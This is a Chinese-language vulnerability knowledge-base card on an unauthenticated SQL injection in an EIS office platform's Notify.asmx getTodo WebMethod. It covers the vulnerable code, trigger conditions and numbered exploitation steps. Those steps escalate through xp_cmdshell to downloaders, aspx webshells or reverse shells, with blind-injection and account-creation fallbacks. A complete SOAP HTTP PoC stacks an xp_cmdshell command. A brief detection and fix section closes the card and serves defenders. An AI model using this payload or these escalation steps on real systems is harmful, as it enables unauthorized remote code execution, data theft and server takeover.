---
id: web-generic-sqli-eis-notify-asmx-loginname-xp-cmdshell
title: EIS 办公平台 Notify.asmx getTodo：targets.LoginName 直拼 SQL 并打通 xp_cmdshell
type: scenario
domain: web
path: web/generic/sqli
technique: dotnet-asmx-json-field-concat-mssql-xpcmdshell
tags:
- sqli
- dotnet
- asmx
- webservice
- mssql
- xp-cmdshell
- oa
- unauth
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V52
  verified_at: '2026-11-05T09:16:50+08:00'
  notes: 已对照原文与图15/16核对：Notify.cs 的 [WebMethod] getTodo 先 JsonConvert.DeserializeObject<Person>(targets)，再取 person.LoginName 拼进 DataAccess.GetOneStrValue($"SELECT id FROM FI_ORG_EMP where account=N'{person.LoginName}'")，与卡内代码一致；web.config 表列 XX 目录 <allow users="*"/> 匿名，前台可达；图15 SOAP POST /Notify.asmx（SOAPAction http://tempuri.org/getTodo）中 targets 为 {"LoginName":"test';EXEC xp_cmdshell 'echo 111>C:\Users\Public\1.txt';--"}，返回 200，且资源管理器显示 C:\Users\Public\1.txt 已生成，xp_cmdshell 写文件已打通。卡内“进一步命令执行/GetShell”表述成立；PoC 未本机执行。原文未给产品版本，未设置 affected_versions；frontmatter 无 sources/source_url。
url: /docs/web/generic/sqli/web-generic-sqli-eis-notify-asmx-loginname-xp-cmdshell/
draft: false
kb_aliases:
- EIS Notify.asmx 注入
- getTodo SQL 注入
- LoginName 注入
- ASMX JSON 参数注入
- xp_cmdshell 写文件
- WebService 前台注入
---

## 一句话结论

某 EIS 办公平台的 `Notify.asmx` 的 `getTodo` WebMethod 把 `targets` JSON 反序列化后取 `person.LoginName` 直接拼进 `SELECT id FROM FI_ORG_EMP where account=N'{...}'`；该 ASMX 接口前台匿名可达，攻击者可用 MSSQL 堆叠注入执行 `xp_cmdshell` 写文件，文章已验证写入 `C:\Users\Public\1.txt`，具备进一步命令执行/GetShell 条件。

## 原理

- 入口：`bin/yard.WebService/yard.WebService.WS.Notify/Notify.cs`，`[WebMethod] public NotifyResult getTodo(string targets, int type, string otherCond, int rowSize, int pageNo)`。
- 取参：`Person person = JsonConvert.DeserializeObject<Person>(targets);`，随后 `if (!string.IsNullOrEmpty(person.LoginName))` 进入查询。
- 拼接：`DataAccess.GetOneStrValue($"SELECT id FROM FI_ORG_EMP where account=N'{person.LoginName}'")`。`LoginName` 来自 JSON 字段，处于 `N'...'` 字符串上下文，未参数化、未转义。
- 缺陷：JSON 反序列化只负责取值，不提供任何 SQL 安全；攻击者用单引号闭合 `N'...'` 后即可堆叠任意 MSSQL 语句。
- 为什么前台可达：`web.config` 中 `XX` 目录（WebService 接口目录）配置为 `<allow users="*" />`，所有 ASMX 文件匿名可访问，`getTodo` 本身也没有权限校验。
- 危害：文章用 `EXEC xp_cmdshell 'echo 111>C:\Users\Public\1.txt'` 成功落盘，证明数据库账号具备 `xp_cmdshell` 执行权限；同样的原语可替换为下载/写入 webshell、添加账号或直接命令执行，是完整的前台 SQL 注入到 RCE 链。

## 触发条件

- 目标 EIS 办公平台暴露 `Notify.asmx`，且 `XX` WebService 目录按默认配置匿名访问。
- `getTodo` 方法可达，`targets` 可传入合法 JSON 且 `LoginName` 非空。
- 数据库为 MSSQL，连接账号拥有 `xp_cmdshell` 执行权限（文章环境满足）。
- 若 `xp_cmdshell` 被禁用，仍可用堆叠/盲注做数据窃取。

## 利用步骤

1. 先发送正常 SOAP 请求确认 `getTodo` 可调用、返回结构正常。
2. 构造 `targets` JSON，把 `LoginName` 设为 `test';EXEC xp_cmdshell 'echo 111>C:\Users\Public\1.txt';--`。
3. 发送 SOAP POST 到 `/Notify.asmx`，`SOAPAction: "http://tempuri.org/getTodo"`。
4. 到目标主机对应路径确认文件已生成（文章截图 `C:\Users\Public\1.txt` 内容为 111），证明命令执行。
5. 将命令替换为下载器/写 aspx 马/反弹 shell；若出网受限，可先写 webshell 到 Web 目录。
6. 若 `xp_cmdshell` 不可用，改用 `WAITFOR DELAY` 时间盲注逐位取数，或堆叠 `INSERT` 创建账号。

## PoC

```http
POST /Notify.asmx HTTP/1.1
Host: target.example:8001
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://tempuri.org/getTodo"
Content-Length: 529

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getTodo xmlns="http://tempuri.org/">
      <targets>{"LoginName":"test';EXEC xp_cmdshell 'echo 111>C:\Users\Public\1.txt';--"}</targets>
      <type>1</type>
      <otherCond></otherCond>
      <rowSize>10</rowSize>
      <pageNo>1</pageNo>
    </getTodo>
  </soap:Body>
</soap:Envelope>
```

```text
# 预期：SOAP 返回 200/正常结构；目标主机 C:\Users\Public\1.txt 内容为 111。
# 注意 XML 中 JSON 内的引号需按 SOAP 编码规则处理，实际发送时可用 CDATA 或转义。
```

## 变体与关联

- 变体：`type`/`otherCond`/`rowSize`/`pageNo` 若同样参与后续 SQL，也可作为注入点；`LoginName` 是文章确认的一处。
- 变体：`xp_cmdshell` 被禁用时可尝试 `sp_OACreate`、`sp_configure` 提权或 CLR 程序集；权限不足则退化为盲注取数。
- 关联：[[web-generic-sqli-eis-down-aspx-i-param-mssql]]（同系统另一处前台 MSSQL 注入）；[[web-generic-sqli-dotnet-handler-mssql-param-concat-version]]（.NET 参数直拼 MSSQL 同类模式）。
- 边界：文章在测试环境验证了 `xp_cmdshell` 写文件；真实目标是否启用 `xp_cmdshell`、数据库账号权限是否足够需现场确认，不能默认所有部署都可 RCE。

## 检测与防御

- 检测：审计 ASMX `[WebMethod]` 中反序列化字段进入 SQL 的路径；监控 SOAP 请求体中的 `xp_cmdshell`、`WAITFOR`、单引号堆叠特征；监控 SQL Server 的 `xp_cmdshell` 调用与异常文件写入。
- 修复：`LoginName` 使用参数化查询（`@account`），禁止字符串插值；`getTodo` 增加认证与调用方权限校验。
- 加固：数据库账号最小权限，禁用 `xp_cmdshell` 与 `sp_OACreate`；WebService 目录不要整体匿名放行；对 ASMX 输入做严格 JSON Schema 校验。
